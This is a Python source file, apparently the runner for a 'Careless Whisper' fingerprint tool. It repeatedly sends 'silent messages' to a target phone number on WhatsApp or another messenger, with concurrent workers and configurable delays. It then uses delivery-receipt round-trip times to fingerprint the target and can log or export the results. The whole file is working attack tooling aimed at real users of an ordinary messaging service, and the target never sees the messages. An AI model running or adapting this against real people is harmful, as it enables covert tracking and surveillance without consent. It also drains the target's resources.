import asyncio
import logging
from logging import getLogger
from typing import Callable, Awaitable, Optional, Protocol
from argparse import ArgumentParser
from datetime import datetime

from carelesswhisper.exporters.base import BaseExporter
from carelesswhisper.messengers.base import BaseMessenger, BaseReceiptReport
from carelesswhisper.metrics import Metrics
from carelesswhisper.fingerprint import Fingerprint, FingerprintAnalysis
from carelesswhisper.exploit import Exploit
from carelesswhisper.tools.util import confirm_number, get_exporter, get_messenger

from .config import Settings


logger = getLogger(__name__)

# Type for UI callbacks
UIReportCallback = Callable[[BaseReceiptReport], Awaitable[None]]
UIAnalysisCallback = Callable[[FingerprintAnalysis], Awaitable[None]]


class SettingsProtocol(Protocol):
    """Protocol for settings objects to ensure compatibility between CLI and fingerprint configs."""

    phone_number: str
    provider: str
    exporter: str | None
    metrics: bool
    metrics_port: int
    delay_between_requests: float
    concurrent_requests: int


async def start(
    messenger: BaseMessenger,
    exploit: Exploit,
    fingerprint: Fingerprint,
    settings: SettingsProtocol,
    exporter: BaseExporter | None = None,
    on_report: Optional[UIReportCallback] = None,
    on_analysis: Optional[UIAnalysisCallback] = None,
) -> None:
    """
    Runs the fingerprinting scan with support for UI callbacks and data export.

    Args:
        messenger: The messenger instance for communication.
        exploit: The exploit instance for sending requests.
        fingerprint: The fingerprint analyzer instance.
        settings: Configuration settings.
        exporter: Optional exporter for saving results.
        on_report: Optional callback called when a new report is received.
        on_analysis: Optional callback called when analysis is updated.
    """
    logger.info(f"Starting fingerprinting scan for {settings.phone_number}")
    await confirm_number(settings.phone_number, messenger)

    # Initialize metrics if enabled
    metrics = Metrics() if settings.metrics else None
    metrics.start_server(settings.metrics_port) if metrics else None

    # Create a semaphore to limit concurrent in-flight requests
    logger.info(
        f"Concurrency level set to: {settings.concurrent_requests} requests in parallel."
    )
    semaphore = asyncio.Semaphore(settings.concurrent_requests)

    async def on_report_internal(report: BaseReceiptReport):
        """Internal handler for reports that chains to user callbacks."""
        # Save to exporter if enabled
        if exporter:
            exporter.save_rtt(report)

        # Update metrics if enabled
        if metrics:
            metrics.report_ran_ping(settings.phone_number)
            metrics.report_rtt(report)

        # Register report with fingerprint analyzer
        fingerprint.register_report(report)

        # Log the report
        logger.info(
            f"Received report: {report.delay:.2f}ms RTT for {report.phone_number}"
        )

        # Call UI callback if provided
        if on_report:
            await on_report(report)

        # Perform analysis and call analysis callback
        analysis = await fingerprint.analyze()
        if on_analysis:
            await on_analysis(analysis)

    async def concurrent_worker():
        """Worker that continuously sends requests with semaphore protection on sends."""
        while exploit.running:
            # Acquire semaphore to limit concurrent in-flight requests
            async with semaphore:
                # Send a silent message to trigger delivery receipt
                msg_id = await messenger.send_silent_message(settings.phone_number)
                logger.info(
                    f"Sent silent message to {settings.phone_number} to trigger delivery receipt (ID: {msg_id})"
                )
                # Record the send time
                exploit._message_send_times[msg_id] = datetime.now()

            # Sleep between requests without holding the semaphore
            # This allows other workers to send messages while we wait
            await asyncio.sleep(settings.delay_between_requests)

    # Register the report listener with the exploit
    exploit.add_listener(on_report_internal)

    # Create multiple concurrent workers
    # Start the exploit's listening but not its sending loop
    exploit.running = True
    tasks = [
        asyncio.create_task(concurrent_worker())
        for _ in range(settings.concurrent_requests)
    ]

    # Wait for all tasks to complete (they run indefinitely)
    await asyncio.gather(*tasks)


async def _connect_and_run(
    messenger: BaseMessenger,
    exploit: Exploit,
    fingerprint: Fingerprint,
    settings: SettingsProtocol,
    exporter: BaseExporter | None = None,
    on_report: Optional[UIReportCallback] = None,
    on_analysis: Optional[UIAnalysisCallback] = None,
) -> None:
    # Start connection in background task
    logger.info("Starting messenger connection...")
    connection_task = asyncio.create_task(messenger.start())

    # Wait for the messenger to be ready before starting the scanning task
    logger.info("Waiting for messenger to be ready...")
    await messenger.wait_until_ready()
    logger.info("Messenger is ready!")

    # Start scanning in another background task
    logger.info("Starting exploit and scanning...")
    scanning_task = asyncio.create_task(
        start(
            messenger=messenger,
            exploit=exploit,
            fingerprint=fingerprint,
            settings=settings,
            exporter=exporter,
            on_report=on_report,
            on_analysis=on_analysis,
        )
    )

    # Wait for both tasks to complete (they run indefinitely)
    logger.info("Fingerprinting in progress... Press Ctrl+C to stop")
    await asyncio.gather(connection_task, scanning_task)


async def main(
    messenger: BaseMessenger | None = None,
    exporter: BaseExporter | None = None,
    settings: SettingsProtocol | None = None,
    on_report: Optional[UIReportCallback] = None,
    on_analysis: Optional[UIAnalysisCallback] = None,
) -> None:
    """
    Main entry point for the fingerprinting tool.

    Args:
        messenger: Optional messenger instance. If not provided, will be created.
        exporter: Optional exporter instance for saving results.
        settings: Optional settings instance. If not provided, will be created from CLI args.
        on_report: Optional callback for when a new report is received.
        on_analysis: Optional callback for when fingerprint analysis is updated.
    """
    # Load settings if not provided
    if not settings:
        settings = Settings()  # type: ignore

    logger.info(f"Loaded settings for phone number: {settings.phone_number}")
    logger.info(f"Provider: {settings.provider}, Exporter: {settings.exporter}")

    # Create Exploit instance
    exploit = Exploit(settings.phone_number)
    logger.info("Exploit instance created")

    # Create Fingerprint instance to validate exploit
    fingerprint = Fingerprint(exploit=exploit)
    logger.info("Fingerprint analyzer initialized")

    # Create messenger if not provided
    if not messenger:
        logger.info(f"Creating {settings.provider} messenger...")
        messenger = await get_messenger(settings.provider, exploit.on_delivery)
        logger.info("Messenger created successfully")

    # Create exporter if not provided
    if not exporter:
        if settings.exporter:
            logger.info(f"Creating {settings.exporter} exporter...")
            exporter = get_exporter(settings.exporter, settings.phone_number)
            logger.info("Exporter created successfully")
        else:
            logger.info("No exporter specified, results will not be saved")

    logger.info("Starting fingerprinting tool...")
    await _connect_and_run(
        messenger=messenger,
        settings=settings,
        exploit=exploit,
        fingerprint=fingerprint,
        exporter=exporter,
        on_report=on_report,
        on_analysis=on_analysis,
    )


if __name__ == "__main__":
    import sys
    from argparse import ArgumentParser
    from carelesswhisper.tools.fingerprint.config import Settings

    # Parse command-line arguments
    parser = ArgumentParser(
        description="Careless Whisper - Fingerprint Tool",
        prog="fingerprint",
    )
    parser.add_argument(
        "--phone-number",
        "-p",
        type=str,
        required=True,
        help="Target phone number for fingerprinting",
    )
    parser.add_argument(
        "--provider",
        type=str,
        default="whatsapp",
        help="Messenger provider to use (default: whatsapp)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=1.0,
        help="Delay between requests in seconds (default: 1.0)",
    )
    parser.add_argument(
        "--concurrent",
        type=int,
        default=5,
        help="Number of concurrent requests (default: 5)",
    )
    parser.add_argument(
        "--exporter",
        type=str,
        help="Exporter to use for saving results (e.g., csv)",
    )
    parser.add_argument(
        "--metrics",
        action="store_true",
        help="Enable Prometheus metrics server",
    )
    parser.add_argument(
        "--metrics-port",
        type=int,
        default=8000,
        help="Port for the Prometheus metrics server (default: 8000)",
    )
    parser.add_argument(
        "--ignore-unregistered",
        action="store_true",
        help="Ignore warning for unregistered phone numbers",
    )
    parser.add_argument(
        "--log-level",
        type=str,
        default="INFO",
        choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"],
        help="Logging level (default: INFO)",
    )

    args = parser.parse_args()

    # Configure logging
    logging.basicConfig(
        level=getattr(logging, args.log_level),
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    try:
        # Create settings from parsed arguments using field names (populate_by_name=True)
        settings = Settings(
            **{
                "phone_number": args.phone_number,
                "provider": args.provider,
                "delay_between_requests": args.delay,
                "concurrent_requests": args.concurrent,
                "metrics": args.metrics,
                "metrics_port": args.metrics_port,
                "exporter": args.exporter,
                "ignore_unregistered_warning": args.ignore_unregistered,
            }
        )
    except Exception as e:
        logger.error(f"Error creating settings: {e}")
        sys.exit(1)

    try:
        asyncio.run(main(settings=settings))
    except KeyboardInterrupt:
        logger.info("Fingerprinting tool terminated by user.")
        print("\nGoodbye!")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
